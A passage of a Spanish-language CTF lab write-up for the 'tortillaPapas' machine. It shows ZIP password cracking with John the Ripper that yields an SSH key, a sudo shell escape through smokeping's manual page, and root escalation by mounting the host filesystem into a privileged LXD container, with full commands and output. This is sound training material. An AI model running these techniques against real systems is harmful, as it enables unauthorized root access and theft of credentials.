+</span></span><span style="display:flex;"><span>ver 2.0 efh <span style="color:#ae81ff">5455</span> efh <span style="color:#ae81ff">7875</span> cositas.zip/sa_matao_Paco.txt PKZIP Encr: TS_chk, cmplen<span style="color:#f92672">=</span>85, decmplen<span style="color:#f92672">=</span>90, crc<span style="color:#f92672">=</span>01C0A4B7 ts<span style="color:#f92672">=</span>8DF1 cs<span style="color:#f92672">=</span>8df1 type<span style="color:#f92672">=</span><span style="color:#ae81ff">8</span>
+</span></span><span style="display:flex;"><span>NOTE: It is assumed that all files in each archive have the same password.
+</span></span><span style="display:flex;"><span>If that is not the <span style="color:#66d9ef">case</span>, the hash may be uncrackable. To avoid this, use
+</span></span><span style="display:flex;"><span>option -o to pick a file at a time.
+</span></span></code></pre></div><p>Y con <strong>JohnTheRipper</strong>, vamos a crackear el hash:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>john -w:/usr/share/wordlists/rockyou.txt hashZIP
+</span></span><span style="display:flex;"><span>Using default input encoding: UTF-8
+</span></span><span style="display:flex;"><span>Loaded <span style="color:#ae81ff">1</span> password hash <span style="color:#f92672">(</span>PKZIP <span style="color:#f92672">[</span>32/64<span style="color:#f92672">])</span>
+</span></span><span style="display:flex;"><span>Will run <span style="color:#ae81ff">5</span> OpenMP threads
+</span></span><span style="display:flex;"><span>Press <span style="color:#e6db74">&#39;q&#39;</span> or Ctrl-C to abort, almost any other key <span style="color:#66d9ef">for</span> status
+</span></span><span style="display:flex;"><span>cassandra        <span style="color:#f92672">(</span>cositas.zip<span style="color:#f92672">)</span>     
+</span></span><span style="display:flex;"><span>1g 0:00:00:00 DONE <span style="color:#f92672">(</span>2025-03-22 23:32<span style="color:#f92672">)</span> 33.33g/s 341333p/s 341333c/s 341333C/s 123456..1asshole
+</span></span><span style="display:flex;"><span>Use the <span style="color:#e6db74">&#34;--show&#34;</span> option to display all of the cracked passwords reliably
+</span></span><span style="display:flex;"><span>Session completed.
+</span></span></code></pre></div><p>Bien, obtuvimos la contraseña del <strong>archivo ZIP</strong>.</p>
+<p>Ahora sí, descomprimamos ese archivo:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>unzip cositas.zip
+</span></span><span style="display:flex;"><span>Archive:  cositas.zip
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>cositas.zip<span style="color:#f92672">]</span> id_rsa password: 
+</span></span><span style="display:flex;"><span>replace id_rsa? <span style="color:#f92672">[</span>y<span style="color:#f92672">]</span>es, <span style="color:#f92672">[</span>n<span style="color:#f92672">]</span>o, <span style="color:#f92672">[</span>A<span style="color:#f92672">]</span>ll, <span style="color:#f92672">[</span>N<span style="color:#f92672">]</span>one, <span style="color:#f92672">[</span>r<span style="color:#f92672">]</span>ename: r
+</span></span><span style="display:flex;"><span>new name: id_rsaCositas
+</span></span><span style="display:flex;"><span>  inflating: id_rsaCositas           
+</span></span><span style="display:flex;"><span>  inflating: sa_matao_Paco.txt       
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>ls
+</span></span><span style="display:flex;"><span>cositas.zip  hash  hashZIP  id_rsa  id_rsaCositas  sa_matao_Paco.txt
+</span></span></code></pre></div><p>Parece que obtuvimos los mismos archivos que encontramos en el directorio <code>/opt</code>.</p>
+<h3 id="shellEsc">Aplicando Shell Escape para Escalar Privilegios y Convertirnos en Usuario concebolla</h3>
+<p>Si revisamos los privilegios que tiene el <strong>usuario sincebolla</strong>, podremos ver que podemos usar un binario:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sincebolla@tortillapapas:~$ sudo -l
+</span></span><span style="display:flex;"><span>Matching Defaults entries <span style="color:#66d9ef">for</span> sincebolla on tortillapapas:
+</span></span><span style="display:flex;"><span>    env_reset, mail_badpass, secure_path<span style="color:#f92672">=</span>/usr/local/sbin<span style="color:#ae81ff">\:</span>/usr/local/bin<span style="color:#ae81ff">\:</span>/usr/sbin<span style="color:#ae81ff">\:</span>/usr/bin<span style="color:#ae81ff">\:</span>/sbin<span style="color:#ae81ff">\:</span>/bin, use_pty
+</span></span><span style="display:flex;"><span>.
+</span></span><span style="display:flex;"><span>User sincebolla may run the following commands on tortillapapas:
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">(</span>concebolla<span style="color:#f92672">)</span> NOPASSWD: /usr/sbin/smokeping
+</span></span></code></pre></div><p>Investigando un poco, encuentro que podemos intentar aplicar <strong>Shell Escape</strong> si es que podemos utilizar el argumento <strong>man</strong>.</p>
+<table>
+	<thead>
+			<tr>
+					<th style="text-align: center"><strong>Shell Escape</strong></th>
+			</tr>
+	</thead>
+	<tbody>
+			<tr>
+					<td style="text-align: center"><em>Un Shell Escape es una técnica que permite salir de un programa restringido y obtener acceso a una shell interactiva. Se usa comúnmente en entornos donde se ejecutan programas con privilegios elevados o en sistemas restringidos para intentar obtener acceso no autorizado.</em></td>
+			</tr>
+	</tbody>
+</table>
+<p>Veamos si podemos verlo con el argumento <strong>&ndash;help</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sincebolla@tortillapapas:~$ sudo -u concebolla /usr/sbin/smokeping --help
+</span></span><span style="display:flex;"><span>Usage:
+</span></span><span style="display:flex;"><span>    smokeping <span style="color:#f92672">[</span> --email | --makepod | --version | --restart <span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>     Options:
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>     --man<span style="color:#f92672">[=</span>x<span style="color:#f92672">]</span>    Show the manpage <span style="color:#66d9ef">for</span> the program <span style="color:#f92672">(</span>or <span style="color:#66d9ef">for</span> probe x, <span style="color:#66d9ef">if</span> specified<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>     --help       Help :-<span style="color:#f92672">)</span>
+</span></span></code></pre></div><p>Ahí está.</p>
+<p>Aquí dejo algunos links de referencia:</p>
+<ul>
+<li><a href="https://medium.verylazytech.com/shell-escapes-cheatsheet-214f05ae777e" target="_blank">Shell Escapes Cheatsheet</a></li>
+<li><a href="https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/escaping-from-limited-bash.html#bash-jails" target="_blank">HackTricks: Escaping from Jails - Bash Jails</a></li>
+</ul>
+<p>Entremos al <strong>argumento man</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sincebolla@tortillapapas:~$ sudo -u concebolla /usr/sbin/smokeping --man
+</span></span></code></pre></div><p>Ahora estamos dentro del manual del binario.</p>
+<p>Probemos si nos permite escribir el símbolo <code>!</code> o <code>:</code>:</p>
+<p align="center">
+<img src="/assets/images/THL-writeup-tortillaPapas/Captura15.png">
+</p>
+<p>Parece que solo nos permite escribir el símbolo <code>!</code>, esto es bueno.</p>
+<p>Podemos probar dos formas de escapar del manual:</p>
+<p align="center">
+<img src="/assets/images/THL-writeup-tortillaPapas/Captura13.png">
+</p>
+<p align="center">
+<img src="/assets/images/THL-writeup-tortillaPapas/Captura14.png">
+</p>
+<p>Ejecutando cualquiera de esas dos, permite que escapemos del manual y nos convertimos en el <strong>usuario concebolla</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>concebolla@tortillapapas:/home/sincebolla$ whoami
+</span></span><span style="display:flex;"><span>concebolla
+</span></span></code></pre></div><h3 id="lxd">Escalando Privilegios Aprovechandonos del Grupo lxd</h3>
+<p>Al revisar los privilegios de nuestro usuario, nos pide la contraseña del usuario, que no tenemos, por lo que no sabemos que acciones podemos realizar:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>concebolla@tortillapapas:~$ sudo -l
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>sudo<span style="color:#f92672">]</span> contraseña para concebolla: 
+</span></span><span style="display:flex;"><span>sudo: a password is required
+</span></span></code></pre></div><p>Y revisando el directorio de este usuario, no encontraremos nada:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>concebolla@tortillapapas:~$ ls -la
+</span></span><span style="display:flex;"><span>total <span style="color:#ae81ff">32</span>
+</span></span><span style="display:flex;"><span>drwx------ <span style="color:#ae81ff">4</span> concebolla concebolla <span style="color:#ae81ff">4096</span> mar <span style="color:#ae81ff">23</span> 08:08 .
+</span></span><span style="display:flex;"><span>drwxr-xr-x <span style="color:#ae81ff">4</span> root       root       <span style="color:#ae81ff">4096</span> abr <span style="color:#ae81ff">13</span>  <span style="color:#ae81ff">2024</span> ..
+</span></span><span style="display:flex;"><span>lrwxrwxrwx <span style="color:#ae81ff">1</span> root       root          <span style="color:#ae81ff">9</span> abr <span style="color:#ae81ff">14</span>  <span style="color:#ae81ff">2024</span> .bash_history -&gt; /dev/null
+</span></span><span style="display:flex;"><span>-rw-r--r-- <span style="color:#ae81ff">1</span> concebolla concebolla  <span style="color:#ae81ff">220</span> abr <span style="color:#ae81ff">12</span>  <span style="color:#ae81ff">2024</span> .bash_logout
+</span></span><span style="display:flex;"><span>-rw-r--r-- <span style="color:#ae81ff">1</span> concebolla concebolla <span style="color:#ae81ff">3526</span> abr <span style="color:#ae81ff">12</span>  <span style="color:#ae81ff">2024</span> .bashrc
+</span></span><span style="display:flex;"><span>drwxr-x--- <span style="color:#ae81ff">3</span> concebolla concebolla <span style="color:#ae81ff">4096</span> abr <span style="color:#ae81ff">13</span>  <span style="color:#ae81ff">2024</span> .config
+</span></span><span style="display:flex;"><span>-rw------- <span style="color:#ae81ff">1</span> concebolla concebolla   <span style="color:#ae81ff">40</span> mar <span style="color:#ae81ff">23</span> 08:08 .lesshst
+</span></span><span style="display:flex;"><span>drwxr-xr-x <span style="color:#ae81ff">3</span> concebolla concebolla <span style="color:#ae81ff">4096</span> mar <span style="color:#ae81ff">23</span> 08:02 .local
+</span></span><span style="display:flex;"><span>-rw-r--r-- <span style="color:#ae81ff">1</span> concebolla concebolla  <span style="color:#ae81ff">807</span> abr <span style="color:#ae81ff">12</span>  <span style="color:#ae81ff">2024</span> .profile
+</span></span></code></pre></div><p>Pero al revisar los grupos a los que pertenece, encontramos que está dentro del grupo <strong>LXD</strong>.</p>
+<table>
+	<thead>
+			<tr>
+					<th style="text-align: center"><strong>LXD</strong></th>
+			</tr>
+	</thead>
+	<tbody>
+			<tr>
+					<td style="text-align: center"><em>LXD es una capa de administración sobre LXC, diseñada para proporcionar una experiencia similar a la de una máquina virtual, pero con la eficiencia de los contenedores. Ofrece una forma sencilla de crear y gestionar contenedores de sistemas operativos completos, como Ubuntu, Debian, Alpine, etc.</em></td>
+			</tr>
+	</tbody>
+</table>
+<table>
+	<thead>
+			<tr>
+					<th style="text-align: center"><strong>Grupo LXD</strong></th>
+			</tr>
+	</thead>
+	<tbody>
+			<tr>
+					<td style="text-align: center"><em>En los sistemas donde LXD está instalado, existe un grupo de usuarios llamado lxd. Este grupo permite a los usuarios ejecutar y administrar contenedores sin necesidad de permisos root. Si un usuario forma parte del grupo lxd, puede ejecutar comandos de LXD sin necesidad de usar sudo.</em></td>
+			</tr>
+	</tbody>
+</table>
+<h4 id="lxd2">Escalando Privilegios Aprovechandonos del Grupo LXD y Con Internet en la Máquina Víctima</h4>
+<p>En el siguiente blog, podemos encontrar una forma de crear una montura de todo el sistema con la herramienta <strong>lxc</strong>, siendo esta una forma en la que es necesario tener internet en la máquina víctima:</p>
+<ul>
+<li><a href="https://medium.com/@mstrbgn/privilege-escalation-using-lxd-lxc-group-assignment-to-a-user-a-security-misconfiguration-a4892f611d6f" target="_blank">Privilege Escalation Using LXD/LXC Group Assignment To A User: A Security Misconfiguration</a></li>
+</ul>
+<p>Vamos a ponerlo a prueba:</p>
+<ul>
+<li>Mostrando los storages disponibles en <strong>LXD</strong>:</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>concebolla@tortillapapas:~$ lxc storage list
+</span></span><span style="display:flex;"><span>+---------+--------+------------------------------------+-------------+---------+---------+
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>|  NAME   | DRIVER |               SOURCE               | DESCRIPTION | USED BY |  STATE  |
+</span></span><span style="display:flex;"><span>+---------+--------+------------------------------------+-------------+---------+---------+
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>| default | dir    | /var/lib/lxd/storage-pools/default |             | <span style="color:#ae81ff">2</span>       | CREATED |
+</span></span><span style="display:flex;"><span>+---------+--------+------------------------------------+-------------+---------+---------+
+</span></span></code></pre></div><ul>
+<li>Creando un nuevo almacenamiento al que llamamos <strong>mypool</strong>:</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>concebolla@tortillapapas:~$ lxc storage create mypool dir
+</span></span><span style="display:flex;"><span>Storage pool mypool created
+</span></span></code></pre></div><ul>
+<li>Creando un <strong>contenedor LXC</strong>(<code>lxc init</code>) llamado <strong>test</strong> (nombre del contenedor) basado en la imagen <strong>ubuntu:16.04</strong> y configurandolo como privilegiado (<code>-c security.privileged=true</code>):</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>concebolla@tortillapapas:~$ lxc init ubuntu:16.04 test -c security.privileged<span style="color:#f92672">=</span>true
+</span></span><span style="display:flex;"><span>Creating test
+</span></span><span style="display:flex;"><span>Retrieving image: Unpack: 100% <span style="color:#f92672">(</span>3.17GB/s<span style="color:#f92672">)</span>
+</span></span></code></pre></div><ul>
+<li>Revisamos que se haya creado el contenedor:</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>concebolla@tortillapapas:~$ lxc ls
+</span></span><span style="display:flex;"><span>+----------+---------+---------------------+-----------------------------------------------+-----------+-----------+
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>|   NAME   |  STATE  |        IPV4         |                     IPV6                      |   TYPE    | SNAPSHOTS |
+</span></span><span style="display:flex;"><span>+----------+---------+---------------------+-----------------------------------------------+-----------+-----------+
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>| ignite   | RUNNING |        XXXX  <span style="color:#f92672">(</span>eth0<span style="color:#f92672">)</span> |                     XXXX               <span style="color:#f92672">(</span>eth0<span style="color:#f92672">)</span> | CONTAINER | <span style="color:#ae81ff">0</span>         |
+</span></span><span style="display:flex;"><span>+----------+---------+---------------------+-----------------------------------------------+-----------+-----------+
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>| test     | STOPPED |                     |                     XXXX               <span style="color:#f92672">(</span>eth0<span style="color:#f92672">)</span> | CONTAINER | <span style="color:#ae81ff">0</span>         |
+</span></span><span style="display:flex;"><span>+----------+---------+---------------------+-----------------------------------------------+-----------+-----------+
+</span></span></code></pre></div><ul>
+<li>Montando el sistema de archivos del host dentro del <strong>contenedor LXC</strong> llamado <strong>test</strong>:</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>concebolla@tortillapapas:~$ lxc config device add test hack disk source<span style="color:#f92672">=</span>/ path<span style="color:#f92672">=</span>/mnt/root recursive<span style="color:#f92672">=</span>true 
+</span></span><span style="display:flex;"><span>Device hack added to test
+</span></span></code></pre></div><p>Aquí <code>lxc config device add</code> agrega un dispositivo al contenedor <strong>test</strong>, el nombre <strong>hack</strong> es el que se le asignó al dispositivo agregado, <strong>disk</strong> define el tipo de dispositivo siendo este caso un <strong>disco (filesystem)</strong>, <code>source=/</code> crea la montura de la raíz del host dentro del contenedor, <code>path=/mnt/root</code> indica que la montura quedara dentro del contenedor en la ruta <code>/mnt/root</code>, y por último <code>recursive=true</code> incluye todo el contenido de <code>/</code>, permitiendo el acceso recursivo a todos los archivos y subdirectorios.</p>
+<ul>
+<li>Iniciando contenedor <strong>test</strong>:</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>concebolla@tortillapapas:~$ lxc start test
+</span></span></code></pre></div><ul>
+<li>Listando los contenedores activos:</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>concebolla@tortillapapas:~$ lxc ls
+</span></span><span style="display:flex;"><span>+--------+---------+---------------------+-----------------------------------------------+-----------+-----------+
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>|  NAME  |  STATE  |        IPV4         |                     IPV6                      |   TYPE    | SNAPSHOTS |
+</span></span><span style="display:flex;"><span>+--------+---------+---------------------+-----------------------------------------------+-----------+-----------+
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>| ignite | RUNNING |        XXXX  <span style="color:#f92672">(</span>eth0<span style="color:#f92672">)</span> |                     XXXX               <span style="color:#f92672">(</span>eth0<span style="color:#f92672">)</span> | CONTAINER | <span style="color:#ae81ff">0</span>         |
+</span></span><span style="display:flex;"><span>+--------+---------+---------------------+-----------------------------------------------+-----------+-----------+
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>| test   | RUNNING |                     |                     XXXX               <span style="color:#f92672">(</span>eth0<span style="color:#f92672">)</span> | CONTAINER | <span style="color:#ae81ff">0</span>         |
+</span></span><span style="display:flex;"><span>+--------+---------+---------------------+-----------------------------------------------+-----------+-----------+
+</span></span></code></pre></div><ul>
+<li>Ejecutando una sesión Shell dentro del <strong>contenedor test</strong>:</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>concebolla@tortillapapas:~$ lxc exec test /bin/sh
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># whoami</span>
+</span></span><span style="display:flex;"><span>root
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># /bin/bash</span>
+</span></span><span style="display:flex;"><span>root@test:~#
+</span></span></code></pre></div><ul>
+<li>También pudimos haber ejecutado una <strong>sesión de Bash</strong>:</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>concebolla@tortillapapas:/home/sincebolla$ lxc exec test -- /bin/bash
+</span></span><span style="display:flex;"><span>root@test:~#
+</span></span></code></pre></div><ul>
+<li>Listando los archivos del contenedor:</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>root@test:~# ls -lha /mnt/root
+</span></span><span style="display:flex;"><span>total 68K
+</span></span><span style="display:flex;"><span>drwxr-xr-x  <span style="color:#ae81ff">18</span> root root 4.0K Apr <span style="color:#ae81ff">12</span>  <span style="color:#ae81ff">2024</span> .
+</span></span><span style="display:flex;"><span>drwxr-xr-x   <span style="color:#ae81ff">3</span> root root 4.0K Mar <span style="color:#ae81ff">23</span> 07:39 ..
+</span></span><span style="display:flex;"><span>lrwxrwxrwx   <span style="color:#ae81ff">1</span> root root    <span style="color:#ae81ff">7</span> Apr <span style="color:#ae81ff">12</span>  <span style="color:#ae81ff">2024</span> bin -&gt; usr/bin
+</span></span><span style="display:flex;"><span>drwxr-xr-x   <span style="color:#ae81ff">3</span> root root 4.0K Apr <span style="color:#ae81ff">12</span>  <span style="color:#ae81ff">2024</span> boot
+</span></span><span style="display:flex;"><span>drwxr-xr-x  <span style="color:#ae81ff">17</span> root root 3.3K Mar <span style="color:#ae81ff">23</span> 07:37 dev
+</span></span><span style="display:flex;"><span>drwxr-xr-x  <span style="color:#ae81ff">74</span> root root 4.0K Mar <span style="color:#ae81ff">23</span> 04:59 etc
+</span></span><span style="display:flex;"><span>drwxr-xr-x   <span style="color:#ae81ff">4</span> root root 4.0K Apr <span style="color:#ae81ff">13</span>  <span style="color:#ae81ff">2024</span> home
+</span></span><span style="display:flex;"><span>lrwxrwxrwx   <span style="color:#ae81ff">1</span> root root   <span style="color:#ae81ff">30</span> Apr <span style="color:#ae81ff">12</span>  <span style="color:#ae81ff">2024</span> initrd.img -&gt; boot/initrd.img-6.1.0-18-amd64
+</span></span><span style="display:flex;"><span>lrwxrwxrwx   <span style="color:#ae81ff">1</span> root root   <span style="color:#ae81ff">30</span> Apr <span style="color:#ae81ff">12</span>  <span style="color:#ae81ff">2024</span> initrd.img.old -&gt; boot/initrd.img-6.1.0-18-amd64
+</span></span><span style="display:flex;"><span>lrwxrwxrwx   <span style="color:#ae81ff">1</span> root root    <span style="color:#ae81ff">7</span> Apr <span style="color:#ae81ff">12</span>  <span style="color:#ae81ff">2024</span> lib -&gt; usr/lib
+</span></span><span style="display:flex;"><span>lrwxrwxrwx   <span style="color:#ae81ff">1</span> root root    <span style="color:#ae81ff">9</span> Apr <span style="color:#ae81ff">12</span>  <span style="color:#ae81ff">2024</span> lib64 -&gt; usr/lib64
+</span></span><span style="display:flex;"><span>drwx------   <span style="color:#ae81ff">2</span> root root  16K Apr <span style="color:#ae81ff">12</span>  <span style="color:#ae81ff">2024</span> lost+found
+</span></span><span style="display:flex;"><span>drwxr-xr-x   <span style="color:#ae81ff">3</span> root root 4.0K Apr <span style="color:#ae81ff">12</span>  <span style="color:#ae81ff">2024</span> media
+</span></span><span style="display:flex;"><span>drwxr-xr-x   <span style="color:#ae81ff">2</span> root root 4.0K Apr <span style="color:#ae81ff">12</span>  <span style="color:#ae81ff">2024</span> mnt
+</span></span><span style="display:flex;"><span>drwxr-xr-x   <span style="color:#ae81ff">2</span> root root 4.0K Apr <span style="color:#ae81ff">16</span>  <span style="color:#ae81ff">2024</span> opt
+</span></span><span style="display:flex;"><span>dr-xr-xr-x <span style="color:#ae81ff">162</span> root root    <span style="color:#ae81ff">0</span> Mar <span style="color:#ae81ff">23</span> 04:59 proc
+</span></span><span style="display:flex;"><span>drwx------   <span style="color:#ae81ff">4</span> root root 4.0K Apr <span style="color:#ae81ff">18</span>  <span style="color:#ae81ff">2024</span> root
+</span></span><span style="display:flex;"><span>drwxr-xr-x  <span style="color:#ae81ff">22</span> root root  <span style="color:#ae81ff">640</span> Mar <span style="color:#ae81ff">23</span> 07:37 run
+</span></span><span style="display:flex;"><span>lrwxrwxrwx   <span style="color:#ae81ff">1</span> root root    <span style="color:#ae81ff">8</span> Apr <span style="color:#ae81ff">12</span>  <span style="color:#ae81ff">2024</span> sbin -&gt; usr/sbin
+</span></span><span style="display:flex;"><span>drwxr-xr-x   <span style="color:#ae81ff">2</span> root root 4.0K Apr <span style="color:#ae81ff">12</span>  <span style="color:#ae81ff">2024</span> srv
+</span></span><span style="display:flex;"><span>dr-xr-xr-x  <span style="color:#ae81ff">13</span> root root    <span style="color:#ae81ff">0</span> Mar <span style="color:#ae81ff">23</span> 04:59 sys
+</span></span><span style="display:flex;"><span>drwxrwxrwt   <span style="color:#ae81ff">8</span> root root 4.0K Mar <span style="color:#ae81ff">23</span> 07:39 tmp
+</span></span><span style="display:flex;"><span>drwxr-xr-x  <span style="color:#ae81ff">12</span> root root 4.0K Apr <span style="color:#ae81ff">12</span>  <span style="color:#ae81ff">2024</span> usr
+</span></span><span style="display:flex;"><span>drwxr-xr-x  <span style="color:#ae81ff">12</span> root root 4.0K Apr <span style="color:#ae81ff">12</span>  <span style="color:#ae81ff">2024</span> var
+</span></span><span style="display:flex;"><span>lrwxrwxrwx   <span style="color:#ae81ff">1</span> root root   <span style="color:#ae81ff">27</span> Apr <span style="color:#ae81ff">12</span>  <span style="color:#ae81ff">2024</span> vmlinuz -&gt; boot/vmlinuz-6.1.0-18-amd64
+</span></span><span style="display:flex;"><span>lrwxrwxrwx   <span style="color:#ae81ff">1</span> root root   <span style="color:#ae81ff">27</span> Apr <span style="color:#ae81ff">12</span>  <span style="color:#ae81ff">2024</span> vmlinuz.old -&gt; boot/vmlinuz-6.1.0-18-amd64
+</span></span></code></pre></div><p>Observa que se copiaron todos los archivos de la máquina víctima.</p>
+<p>Esto quiere decir que podemos ver los archivos del <strong>Root</strong>, incluso la flag:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>root@test:~# cd /mnt/root/root
+</span></span><span style="display:flex;"><span>root@test:/mnt/root/root# ls -la
+</span></span><span style="display:flex;"><span>total <span style="color:#ae81ff">36</span>
+</span></span><span style="display:flex;"><span>drwx------  <span style="color:#ae81ff">4</span> root root <span style="color:#ae81ff">4096</span> Apr <span style="color:#ae81ff">18</span>  <span style="color:#ae81ff">2024</span> .
+</span></span><span style="display:flex;"><span>drwxr-xr-x <span style="color:#ae81ff">18</span> root root <span style="color:#ae81ff">4096</span> Apr <span style="color:#ae81ff">12</span>  <span style="color:#ae81ff">2024</span> ..
+</span></span><span style="display:flex;"><span>lrwxrwxrwx  <span style="color:#ae81ff">1</span> root root    <span style="color:#ae81ff">9</span> Apr <span style="color:#ae81ff">14</span>  <span style="color:#ae81ff">2024</span> .bash_history -&gt; /dev/null
+</span></span><span style="display:flex;"><span>-rw-r--r--  <span style="color:#ae81ff">1</span> root root  <span style="color:#ae81ff">571</span> Apr <span style="color:#ae81ff">10</span>  <span style="color:#ae81ff">2021</span> .bashrc
+</span></span><span style="display:flex;"><span>-rw-------  <span style="color:#ae81ff">1</span> root root   <span style="color:#ae81ff">20</span> Apr <span style="color:#ae81ff">15</span>  <span style="color:#ae81ff">2024</span> .lesshst
+</span></span><span style="display:flex;"><span>drwxr-xr-x  <span style="color:#ae81ff">3</span> root root <span style="color:#ae81ff">4096</span> Apr <span style="color:#ae81ff">12</span>  <span style="color:#ae81ff">2024</span> .local
+</span></span><span style="display:flex;"><span>-rw-r--r--  <span style="color:#ae81ff">1</span> root root  <span style="color:#ae81ff">161</span> Jul  <span style="color:#ae81ff">9</span>  <span style="color:#ae81ff">2019</span> .profile
+</span></span><span style="display:flex;"><span>-rw-r--r--  <span style="color:#ae81ff">1</span> root root   <span style="color:#ae81ff">66</span> Apr <span style="color:#ae81ff">18</span>  <span style="color:#ae81ff">2024</span> .selected_editor
+</span></span><span style="display:flex;"><span>drwx------  <span style="color:#ae81ff">2</span> root root <span style="color:#ae81ff">4096</span> Apr <span style="color:#ae81ff">14</span>  <span style="color:#ae81ff">2024</span> .ssh
+</span></span><span style="display:flex;"><span>-rw-r--r--  <span style="color:#ae81ff">1</span> root root   <span style="color:#ae81ff">33</span> Apr <span style="color:#ae81ff">16</span>  <span style="color:#ae81ff">2024</span> root.txt
+</span></span><span style="display:flex;"><span>root@test:/mnt/root/root# cat root.txt
+</span></span><span style="display:flex;"><span>...
+</span></span></code></pre></div><p>Y con esto, terminamos la máquina.</p>
+<h4 id="lxd3">Escalando Privilegios Aprovechandonos del Grupo LXD y Sin Internet en la Máquina Víctima</h4>
+<p>En el siguiente blog, podemos encontrar una forma de crear una montura de todo el sistema con la herramienta <strong>lxc</strong>, siendo esta una forma en la que NO es necesario tener internet en la máquina víctima:</p>
+<ul>
+<li><a href="https://www.hackingarticles.in/lxd-privilege-escalation/" target="_blank">Lxd Privilege Escalation</a></li>
+</ul>
+<p>Vamos a aplicar lo que dice el blog por pasos:</p>
+<ul>
